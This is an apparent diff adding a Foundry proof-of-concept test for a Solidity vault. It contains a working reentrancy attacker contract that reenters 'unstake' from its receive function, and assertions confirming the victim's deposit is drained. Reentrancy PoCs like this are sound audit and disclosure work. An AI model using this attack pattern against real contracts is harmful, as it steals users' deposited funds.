+    Ledger public vault;
+    address public owner;
+    uint256 public attackValue;
+
+    constructor(Ledger _vault) {
+        vault = _vault;
+        owner = msg.sender;
+    }
+
+    function attack() external payable {
+        attackValue = msg.value;
+        vault.fund{value: msg.value}();
+        vault.unstake();
+    }
+
+    receive() external payable {
+        uint256 bal = vault.ledgerOf(address(this));
+        // On vulnerable contract, bal is still attackValue during first callback, so we can reenter
+        if (bal > 0) {
+            // keep reentering while vault has funds
+            if (address(vault).balance >= bal) {
+                vault.unstake();
+            }
+        }
+    }
+
+    function collect() external {
+        payable(owner).transfer(address(this).balance);
+    }
+}
+
+contract PocTest is Test {
+    Ledger vault;
+    ReentrantAttacker attacker;
+    address victim = makeAddr("victim");
+
+    function setUp() public {
+        vault = new Ledger();
+        // victim deposits 10 ether
+        vm.deal(victim, 10 ether);
+        vm.prank(victim);
+        vault.fund{value: 10 ether}();
+    }
+
+    function test_exploit() public {
+        // attacker deposits 1 ether and reenters
+        attacker = new ReentrantAttacker(vault);
+        vm.deal(address(attacker), 1 ether);
+        uint256 vaultBalBefore = address(vault).balance; // 10 ether
+        uint256 attackerBalBefore = address(attacker).balance; // 1 ether (will be sent)
+
+        vm.prank(address(attacker));
+        // need to call attack as attacker contract? Actually attacker contract's attack is called by test, but owner is test? Let's just call directly
+        attacker.attack{value: 1 ether}();
+
+        uint256 vaultBalAfter = address(vault).balance;
+        uint256 attackerBalAfter = address(attacker).balance;
+
+        emit log_named_uint("vaultBalBefore", vaultBalBefore);
+        emit log_named_uint("vaultBalAfter", vaultBalAfter);
+        emit log_named_uint("attackerBalAfter", attackerBalAfter);
+
+        // On vulnerable contract, attacker drains victim funds: vault balance should be 0 or very low, attacker balance > 1 ether
+        assertGt(attackerBalAfter, 1 ether, "exploit failed: attacker did not profit");
+        assertLt(vaultBalAfter, 5 ether, "exploit failed: vault not drained");
+        // also victim's ledger still says 10 ether but vault can't cover it
+        assertLt(vaultBalAfter, vault.ledgerOf(victim), "victim still solvent - no exploit");
+    }
+}

